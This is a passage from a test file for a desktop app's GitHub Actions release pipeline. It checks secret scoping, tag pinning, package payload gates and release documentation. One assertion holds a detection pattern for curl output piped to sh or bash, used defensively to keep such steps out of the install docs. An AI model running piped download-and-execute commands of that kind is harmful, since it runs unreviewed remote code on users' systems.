        application: "${{ format('refs/tags/{0}', steps.requested-ref.outputs.tag) }}",
        tooling: '${{ github.sha }}',
      },
      build: {
        application: '${{ needs.validate.outputs.application_commit }}',
        tooling: '${{ needs.validate.outputs.tooling_commit }}',
      },
      verify: {
        application: '${{ needs.validate.outputs.application_commit }}',
        tooling: '${{ needs.validate.outputs.tooling_commit }}',
      },
    }

    for (const [job, refs] of Object.entries(expectedRefs)) {
      const checkouts = jobSteps(job).filter((step) => step.uses === 'actions/checkout@v7')
      expect(checkouts).toHaveLength(2)
      const tooling = checkouts.find((step) => step.with?.path === '.release-tooling')
      const application = checkouts.find((step) => step.with?.path === undefined)
      expect(tooling?.with).toMatchObject({
        ref: refs.tooling,
        path: '.release-tooling',
        'fetch-depth': 0,
        'persist-credentials': false,
      })
      expect(application?.with).toMatchObject({
        ref: refs.application,
        'fetch-depth': 0,
        'persist-credentials': false,
      })
    }
  })

  it('checks out tagged application root before the final validation tooling checkout', () => {
    const steps = jobSteps('validate')
    const application = steps.findIndex((step) => step.uses === 'actions/checkout@v7' && step.with?.path === undefined)
    const resolution = steps.findIndex((step) => step.name === 'Validate immutable application and tooling commits')
    const tooling = steps.findIndex(
      (step) => step.uses === 'actions/checkout@v7' && step.with?.path === '.release-tooling',
    )

    expect(application).toBeGreaterThan(-1)
    expect(resolution).toBeGreaterThan(application)
    expect(tooling).toBeGreaterThan(resolution)
    expect(steps[application]?.with?.clean).toBeUndefined()
    expect(steps.slice(tooling + 1).some((step) => step.uses === 'actions/checkout@v7')).toBe(false)
  })

  it('pins reviewed actions and exposes signing credentials only to the native draft build', () => {
    const release = workflow()
    const allSteps = Object.values(release.jobs ?? {}).flatMap((job) => job.steps ?? [])
    const allUses = allSteps.map((step) => step.uses).filter(Boolean)
    expect(allUses).toContain('actions/checkout@v7')
    expect(allUses).toContain('actions/setup-node@v6')
    expect(allUses).toContain('tauri-apps/tauri-action@1deb371b0cd8bd54025b384f1cd735e725c4060f')

    const tauri = jobSteps('build').find((step) => step.id === 'tauri')
    expect(tauri?.env).toMatchObject({
      GITHUB_TOKEN: '${{ secrets.GITHUB_TOKEN }}',
      TAURI_SIGNING_PRIVATE_KEY: '${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}',
      TAURI_SIGNING_PRIVATE_KEY_PASSWORD: '${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}',
    })
    const environmentKeys = allSteps.flatMap((step) => Object.keys(step.env ?? {}))
    expect(environmentKeys).not.toEqual(
      expect.arrayContaining(['APPLE_CERTIFICATE', 'APPLE_SIGNING_IDENTITY', 'WINDOWS_CERTIFICATE', 'AZURE_TENANT']),
    )
    for (const step of allSteps.filter((candidate) => candidate.env?.GH_TOKEN)) {
      expect(step.run).not.toMatch(/npm (?:ci|run)/)
    }
  })

  it('keeps app inputs at the tag while executing only the verifier from pinned release tooling', () => {
    const release = workflow()
    const allSteps = Object.values(release.jobs ?? {}).flatMap((job) => job.steps ?? [])
    const verifierCalls = allSteps
      .map((step) => step.run ?? '')
      .filter((run) => run.includes('verify-release-assets.mjs'))
    expect(verifierCalls.length).toBeGreaterThanOrEqual(4)
    for (const run of verifierCalls) {
      expect(run).toContain('node .release-tooling/scripts/verify-release-assets.mjs')
      expect(run).not.toMatch(/node scripts\/verify-release-assets\.mjs/)
    }
    expect(
      verifierCalls.some((run) => run.includes('--integrity-manifest src-tauri/resources/setup-integrity-v1.json')),
    ).toBe(true)
    expect(verifierCalls.filter((run) => run.includes('--tauri-config src-tauri/tauri.conf.json'))).toHaveLength(2)
    expect(allSteps.map((step) => step.run ?? '').join('\n')).not.toMatch(
      /\bcp\b[^\n]*\.release-tooling|Copy-Item[^\n]*\.release-tooling/,
    )

    const buildSteps = jobSteps('build')
    expect(namedStep('build', 'Build release signature verifier').run).toBe(
      'cargo build --locked --manifest-path src-tauri/Cargo.toml --example verify_release_signature',
    )
    expect(namedStep('build', 'Verify application, contract, and examples').run?.trim()).toBe(`npm run format:check
npm run lint
npm run check
npm run test:unit -- --testTimeout=20000 --maxWorkers=1
npm run test:rust
npm run contracts:check
npm run examples:check`)
    expect(buildSteps.find((step) => step.id === 'tauri')?.with).toMatchObject({
      releaseCommitish: '${{ needs.validate.outputs.application_commit }}',
    })
  })

  it('finishes tagged application-wide checks before adding the nested tooling checkout', () => {
    for (const job of ['build', 'verify']) {
      const steps = jobSteps(job)
      const toolingCheckout = steps.findIndex((step) => step.with?.path === '.release-tooling')
      const lastTaggedValidation = Math.max(
        steps.findIndex((step) => step.name === 'Verify application, contract, and examples'),
        steps.findIndex((step) => step.name === 'Build updater signature verifier'),
      )
      expect(lastTaggedValidation).toBeGreaterThan(-1)
      expect(toolingCheckout).toBeGreaterThan(lastTaggedValidation)
    }
  })

  it('re-resolves the immutable tag before native packaging and final verification', () => {
    for (const job of ['build', 'verify']) {
      const assertion = namedStep(job, 'Assert tag still resolves to the validated commit')
      expect(assertion.env).toMatchObject({
        TAG: '${{ needs.validate.outputs.tag }}',
        EXPECTED_COMMIT: '${{ needs.validate.outputs.application_commit }}',
      })
      expect(assertion.run).toContain("REMOTE_TAG_COMMIT=$(git rev-parse 'FETCH_HEAD^{commit}')")
      expect(assertion.run).toContain('Tag moved after validation')
    }
  })

  it('serializes exactly the two DMGs and Windows x64 NSIS target', () => {
    const build = workflow().jobs?.build
    expect(build?.strategy).toMatchObject({ 'max-parallel': 1 })
    expect(build?.strategy?.matrix?.include).toEqual([
      {
        runner: 'macos-latest',
        platform: 'macos',
        arch: 'aarch64',
        rust_target: 'aarch64-apple-darwin',
        bundles: 'dmg',
      },
      {
        runner: 'macos-15-intel',
        platform: 'macos',
        arch: 'x86_64',
        rust_target: 'x86_64-apple-darwin',
        bundles: 'dmg',
      },
      {
        runner: 'windows-latest',
        platform: 'windows',
        arch: 'x86_64',
        rust_target: 'x86_64-pc-windows-msvc',
        bundles: 'nsis',
      },
    ])
    expect(jobSteps('build').some((step) => step.name?.includes('Linux'))).toBe(false)
  })

  it('gates each Tauri-built DMG and NSIS payload with unambiguous extracted-package checks', () => {
    const steps = jobSteps('build')
    const tauri = steps.findIndex((step) => step.id === 'tauri')
    const mac = namedStep('build', 'Verify extracted macOS DMG payload')
    const windows = namedStep('build', 'Verify extracted Windows NSIS payload')
    expect(steps.findIndex((step) => step.name === mac.name)).toBeGreaterThan(tauri)
    expect(steps.findIndex((step) => step.name === windows.name)).toBeGreaterThan(tauri)

    expect(mac.if).toBe("${{ matrix.platform == 'macos' }}")
    expect(mac.shell).toBe('bash')
    expect(mac.run).toContain('hdiutil attach -readonly')
    expect(mac.run).toContain('trap cleanup EXIT')
    expect(mac.run).toContain('${#DMG_FILES[@]} != 1')
    expect(mac.run).toContain('${#APP_BUNDLES[@]} != 1')
    expect(mac.run).toContain('/Contents/Resources/_up_')
    expect(mac.run).toContain('--integrity-manifest src-tauri/resources/setup-integrity-v1.json')

    expect(windows.if).toBe("${{ matrix.platform == 'windows' }}")
    expect(windows.shell).toBe('pwsh')
    expect(windows.run).toContain("[guid]::NewGuid().ToString('N')")
    expect(windows.run).toContain('$installers.Count -ne 1')
    expect(windows.run).toContain('& 7z x')
    expect(windows.run).toContain('$resourceRoots.Count -ne 1')
    expect(windows.run).toContain('$executables.Count -ne 1')
    expect(windows.run).toContain("$expectedApplicationName = 'workflow-studio.exe'")
    expect(windows.run).toContain('--packaged-resource-root')
    expect(windows.run).toContain('--pe-executable')
    expect(windows.run).toContain('--integrity-manifest src-tauri/resources/setup-integrity-v1.json')
  })

  it('selects workflow-studio.exe from an NSIS payload that also contains uninstall.exe', () => {
    const powershellProbe = spawnSync('pwsh', ['-NoLogo', '-NoProfile', '-Command', '$PSVersionTable.PSVersion'])
    if (powershellProbe.error) return

    const root = mkdtempSync(join(tmpdir(), 'workflow-studio-nsis-gate-'))
    const bundleDirectory = join(root, 'src-tauri', 'target', 'x86_64-pc-windows-msvc', 'release', 'bundle', 'nsis')
    const sentinel = join(root, 'verifier-arguments')
    const harnessPath = join(root, 'nsis-gate.ps1')
    mkdirSync(bundleDirectory, { recursive: true })
    writeFileSync(join(bundleDirectory, 'workflow-studio_1.0.1_x64-setup.exe'), 'fixture')
    const gate = namedStep('build', 'Verify extracted Windows NSIS payload').run!.replaceAll(
      '${{ matrix.rust_target }}',
      'x86_64-pc-windows-msvc',
    )
    const harness = `function global:7z {
  $outputArgument = @($args | Where-Object { "$_" -like '-o*' })[0]
  $destination = "$outputArgument".Substring(2)
  $payload = Join-Path $destination 'payload'
  $resources = Join-Path $payload '_up_'
  New-Item -ItemType Directory -Path $resources -Force | Out-Null
  New-Item -ItemType File -Path (Join-Path $payload 'uninstall.exe') -Force | Out-Null
  if ($env:NSIS_FIXTURE_MODE -ne 'missing') {
    New-Item -ItemType File -Path (Join-Path $payload 'workflow-studio.exe') -Force | Out-Null
  }
  if ($env:NSIS_FIXTURE_MODE -eq 'ambiguous') {
    $duplicate = Join-Path $payload 'duplicate'
    New-Item -ItemType Directory -Path $duplicate -Force | Out-Null
    New-Item -ItemType File -Path (Join-Path $duplicate 'workflow-studio.exe') -Force | Out-Null
  }
  $global:LASTEXITCODE = 0
}
function global:node {
  [IO.File]::WriteAllLines($env:VERIFIER_SENTINEL, [string[]]$args)
  $global:LASTEXITCODE = 0
}
try {
${gate}
} catch {
  [Console]::Error.WriteLine($_.Exception.Message)
  exit 1
}`
    writeFileSync(harnessPath, harness)

    const invoke = (mode: 'accepted' | 'missing' | 'ambiguous') => {
      rmSync(sentinel, { force: true })
      return spawnSync('pwsh', ['-NoLogo', '-NoProfile', '-File', harnessPath], {
        cwd: root,
        encoding: 'utf8',
        env: {
          ...process.env,
          NSIS_FIXTURE_MODE: mode,
          RUNNER_TEMP: root,
          VERIFIER_SENTINEL: sentinel,
        },
      })
    }

    try {
      const accepted = invoke('accepted')
      expect(accepted.status, accepted.stderr).toBe(0)
      const verifierArguments = readFileSync(sentinel, 'utf8')
      expect(verifierArguments).toContain('--pe-executable')
      expect(verifierArguments).toMatch(/workflow-studio\.exe/i)
      expect(verifierArguments).not.toMatch(/uninstall\.exe/i)

      const missing = invoke('missing')
      expect(missing.status).toBe(1)
      expect(missing.stderr).toContain('found 0')

      const ambiguous = invoke('ambiguous')
      expect(ambiguous.status).toBe(1)
      expect(ambiguous.stderr).toContain('found 2')
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('keeps the extracted-package gates valid in their native command languages', () => {
    const mac = namedStep('build', 'Verify extracted macOS DMG payload').run!.replaceAll(
      '${{ matrix.rust_target }}',
      'aarch64-apple-darwin',
    )
    const bash = spawnSync('bash', ['-n'], { input: mac, encoding: 'utf8' })
    expect(bash.status, bash.stderr).toBe(0)

    const powershellProbe = spawnSync('pwsh', ['-NoLogo', '-NoProfile', '-Command', '$PSVersionTable.PSVersion'])
    if (powershellProbe.error) return
    const windows = namedStep('build', 'Verify extracted Windows NSIS payload').run!.replaceAll(
      '${{ matrix.rust_target }}',
      'x86_64-pc-windows-msvc',
    )
    const parser = `$source = [Console]::In.ReadToEnd()
$tokens = $null
$errors = $null
[System.Management.Automation.Language.Parser]::ParseInput($source, [ref] $tokens, [ref] $errors) | Out-Null
if ($errors.Count -ne 0) {
  $errors | ForEach-Object { [Console]::Error.WriteLine($_.Message) }
  exit 1
}`
    const powershell = spawnSync('pwsh', ['-NoLogo', '-NoProfile', '-Command', parser], {
      input: windows,
      encoding: 'utf8',
    })
    expect(powershell.status, powershell.stderr).toBe(0)
  })

  it('keeps normalize, upload, re-download, signature/checksum, and exact final validation ordered', () => {
    const steps = jobSteps('verify')
    const position = (name: string) => steps.findIndex((step) => step.name === name)
    const orderedNames = [
      'Download draft assets for metadata normalization',
      'Normalize updater metadata without release credentials',
      'Upload normalized updater metadata',
      'Re-download published updater bytes',
      'Generate checksums from published bytes without release credentials',
      'Upload checksum manifest',
      'Re-download completed draft',
      'Validate completed draft without release credentials',
    ]
    expect(orderedNames.map(position)).toEqual([...orderedNames.map(position)].sort((left, right) => left - right))
    expect(orderedNames.every((name) => position(name) >= 0)).toBe(true)

    const checksums = namedStep('verify', 'Generate checksums from published bytes without release credentials').run!
    const finalValidation = namedStep('verify', 'Validate completed draft without release credentials').run!
    expect(checksums).toContain('--write-checksums')
    expect(checksums).toContain('--signature-verifier "$SIGNATURE_VERIFIER"')
    expect(finalValidation).not.toContain('--write-checksums')
    expect(finalValidation).toContain('--signature-verifier "$SIGNATURE_VERIFIER"')
    expect(finalValidation).toContain('Draft release verified; publish it manually after review.')

    const release = workflow()
    expect(release.jobs?.validate?.permissions).toBeUndefined()
    expect(release.jobs?.build?.permissions).toEqual({ contents: 'write' })
    expect(release.jobs?.verify?.permissions).toEqual({ contents: 'write' })
    const tauri = jobSteps('build').find((step) => step.id === 'tauri')
    expect(tauri?.with).toMatchObject({ releaseDraft: true, prerelease: false })
    expect(steps.map((step) => step.run ?? '').join('\n')).not.toMatch(/gh release edit[^\n]*--draft=false/)
  })

  it('distinguishes an absent release from an existing published release', () => {
    const check = namedStep('validate', 'Check existing release state').run

    expect(check).toContain('RELEASE_STATUS=$(gh api --include')
    expect(check).toContain('if [[ "$RELEASE_STATUS" == "404" ]]')
    expect(check).toContain('elif [[ "$RELEASE_STATUS" == "200" ]]')
    expect(check).toContain('Unexpected GitHub release lookup status')
    expect(check).not.toMatch(/EXISTING_DRAFT=.*\|\| true/)
  })

  it('installs Linux native libraries only in final verification before compiling the tagged Rust verifier', () => {
    const steps = jobSteps('verify')
    const dependencies = steps.findIndex((step) => step.name === 'Install tagged verifier dependencies')
    const verifier = steps.findIndex((step) => step.name === 'Build updater signature verifier')
    expect(dependencies).toBeGreaterThan(-1)
    expect(dependencies).toBeLessThan(verifier)
    expect(steps[dependencies]?.run).toContain(
      'sudo apt-get install -y libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev patchelf xdg-utils',
    )
    expect(jobSteps('build').some((step) => step.run?.includes('apt-get'))).toBe(false)
  })
})

describe('release documentation contract', () => {
  it('documents safe one-line downloads without piping network responses to a shell', () => {
    const installing = readFileSync('docs/installing.md', 'utf8')
    expect(installing).toContain('curl --fail --location')
    expect(installing).toContain('Invoke-RestMethod')
    expect(installing).not.toMatch(/curl[^\n|]*\|\s*(?:sh|bash)/i)
    expect(installing).toContain('SHA256SUMS')
    expect(installing).toContain('Right-click')
    expect(installing).toContain('More info')
    expect(installing).not.toContain('/base/scripts/install')
    expect(installing.match(/2a0ec9f5c5bd95f693d8b97599653700d1471f0c\/scripts\/install/g)).toHaveLength(2)
    expect(installing).toContain('does not automatically adopt later bootstrap-script changes')
  })

  it('documents updater key custody, the base/tag invariant, draft verification, and no OS signing', () => {
    const releasing = readFileSync('docs/releasing.md', 'utf8')
    expect(releasing).toContain('TAURI_SIGNING_PRIVATE_KEY')
    expect(releasing).toContain('TAURI_SIGNING_PRIVATE_KEY_PASSWORD')
    expect(releasing).toContain('base')
    expect(releasing).toContain('draft')
    expect(releasing).toContain('unsigned')
    expect(releasing).toContain('Never publish a release from this workflow automatically')
    expect(releasing).toContain('re-downloads the published `latest.json` bytes before hashing')
    expect(releasing).toContain('re-downloads and validates the completed draft')
  })
})
